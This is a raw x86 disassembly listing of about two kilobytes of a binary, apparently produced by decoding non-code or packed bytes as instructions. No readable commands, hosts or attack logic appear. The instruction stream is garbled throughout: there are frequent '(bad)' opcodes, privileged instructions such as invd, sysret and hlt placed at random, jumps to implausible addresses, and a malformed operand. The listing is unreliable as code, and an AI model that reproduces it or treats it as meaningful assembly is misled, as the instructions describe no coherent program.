  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
